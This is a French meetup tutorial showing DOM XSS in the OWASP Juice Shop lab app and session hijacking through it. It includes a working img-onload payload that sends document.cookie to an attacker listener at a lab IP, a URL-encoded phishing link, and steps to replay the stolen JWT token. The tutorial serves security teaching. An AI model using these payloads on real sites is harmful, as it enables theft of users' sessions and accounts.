# xss-session-hijacking
Extrait d'un meetup Cat-Amania

## Introduction

*Session* une session web est l'état de navigation d'un internaute identifié sur un site. L'internaute ouvre une session en s'authentifiant sur le site. Lorsqu'il a ouvert une session, le serveur va conserver l'état de sa navigation. Par exemple pour un site de e-commerce, l'état de son panier. [https://fr.wikipedia.org/wiki/Session_(informatique)](https://fr.wikipedia.org/wiki/Session_(informatique))

*Cookies* un cookie est une clé-valeur persistée dans le navigateur. C'est un outil technique qui permet de maintenir une session, au fil des différentes requêtes exécutées par le navigateur.

* Affichage du cookie `token`. Le format est JWT
* Rappel de l'objectif du hack. Si on vole le cookie, on vole la session

*JWT* [https://jwt.io/](https://jwt.io/) est un standard pour transmettre des informations signées.
* Observer le contenu du token dans JWT.io
* Voir la date d'expiration du token (donc de la session) avec [https://www.unixtimestamp.com/](https://www.unixtimestamp.com/)

## Découverte de la vulnérabilité XSS

### Démo d'une vulnérabilité _DOM XSS_

Comprendre par l'exemple. L'exemple suivant est un DOM XSS parce-que, à aucun moment, le payload n'est transmis au serveur.

*Le DOM* : c'est le contenu HTML de la page web. Le navigateur lit le HTML pour découvrir la structure et le contenu d'une page. 
* Inspecter le code HTML de juice-shop.

*Le Javascript* : c'est du code source (au même titre que le DOM), qui s'exécute dynamiquement dans le navigateur (contrairement au DOM qui est plutôt statique)
* Exemple d'exécution de JS dans la console.

* Recherche de `toto`, inscription de `toto` dans le DOM. Pour afficher `toto` sur la page, le navigateur lit la balise.
* Objectif : déclencher l'exécution de code Javascript, à partir de la saisie utilisateur. Par exemple : `alert('xss')`
* Feinte (c'est le payload XSS !) pour déclencher l'exécution de JS, en ajoutant du HTML dans le DOM, saisir `<iframe src="javascript:alert('xss')">` dans le champ de recherche

### Les différents types d'attaques XSS

[https://owasp.org/www-community/Types_of_Cross-Site_Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)

* Reflected XSS (AKA Non-Persistent or Type I) : La saisie utilisateur est interprétée par le navigateur, mais n'est pas persistée. Le payload est dans la requête envoyée au serveur.
* Stored XSS (AKA Persistent or Type II) : La saisie utilisateur est persistée (côté serveur), puis interprétée par les nvaigateurs lorsqu'elle est requêtée. Exemples : commentaires sous un article, posts dans un forum.
* DOM Based XSS (AKA Type-0) : La saisie utilisateur est interprétée par le navigateur, mais n'est pas persistée. Le payload n'est pas envoyée au serveur.

## Exploitation de la faille XSS

prérequis : l'utilisateur cible (victime) :
* s'est créé un compte
* s'est authentifié
* a saisi des options de paiement (par exemple)

### Faire exécuter du JS dans le navigateur de la victime

A cette étape, on sait qu'on peut exécuter du JS dans la page, suite à une saisie dans la barre de recherche. Mais comment forcer la victime à saisir du texte dans la barre de recherche ? La réponse est dans l'URL : quand on recherche `toto`, la recherche est transmise à l'application dans l'URL : `http://192.168.79.83:3000/#/search?q=toto`

* démo : envoi d'un email avec un lien `http://192.168.79.83:3000/#/search?q=toto`

### Le JS doit nous envoyer les cookies de la victime

But du hack : Si la cible (victime) est authentifiée dans l'application, on veut voler ses cookies (de façon furtive). 

* démo : exécuter l'instruction JS `document.cookie` dans la console

* Démarrer le serveur d'écoute en python

Quel payload ?
* `<iframe src="http://192.168.79.71:8888/?une_cle=une_valeur">`
  
  `<iframe src='http://192.168.79.71:8888/?'+document.cookie>`

  On voit que le navigateur n'exécute pas le JS `+document.cookie`. La requête envoyée est : `http://192.168.79.71:8888/`

* `<img src=https://github.com/favicon.ico width=0 height=0 onload=this.src='http://192.168.79.71:8888/?'+'une_cle=une_valeur'>`
  
  `<img src=https://github.com/favicon.ico width=0 height=0 onload=this.src='http://192.168.79.71:8888/?'+document.cookie>`
  
  On voit que le navigateur envoie bien ce qu'on veut...

Ensuite on peut récupérer l'URL du lien de phishing.x
* Copier coller dans le navigateur `http://192.168.79.83:3000/#/search?q=%3Cimg%20src%3Dhttps:%2F%2Fgithub.com%2Ffavicon.ico%20width%3D0%20height%3D0%20onload%3Dthis.src%3D'http:%2F%2F192.168.79.71:8888%2F%3F'%2Bdocument.cookie%3E`
* check le payload dans [https://www.urldecoder.org/](https://www.urldecoder.org/)

* Copier coller le jwt dans [https://jwt.io/](https://jwt.io/) : on voit bien le JWT de la cible

### Utiliser le token pour voler la session

* S'authentifier avec un compte quelconque
* Ecraser le cookie dans le navigateur
  ```
  document.cookie = "token=le_token; SameSite=None";
  ```
* Remplacer le [header HTTP](https://developer.mozilla.org/fr/docs/Web/HTTP/Headers) `Authorization` dans chaque requête
  ```
  Authorization: Bearer le_token
  ```
  Pour faire ça, on utilise le proxy burpsuite. Firefox envoie toutes ses requêtes au proxy, et le proxy remplace tous les headers `Authorization` avec la valeur `Bearer le_token`.

## Démos enregistrées :

* [démarrage du serveur d'écoute et test du payload](./assets/dom-xss-session-2.webm?raw=true)
* [à partir du token, vol de session](./assets/dom-xss-session-4.webm?raw=true)


## Résumé de l'attaque :

![schéma vol de session](./assets/2-meetup-session-hijacking.drawio.png?raw=true)

## La science du XSS...

[https://github.com/s0md3v/AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)

[https://twitter.com/theXSSrat](https://twitter.com/theXSSrat)
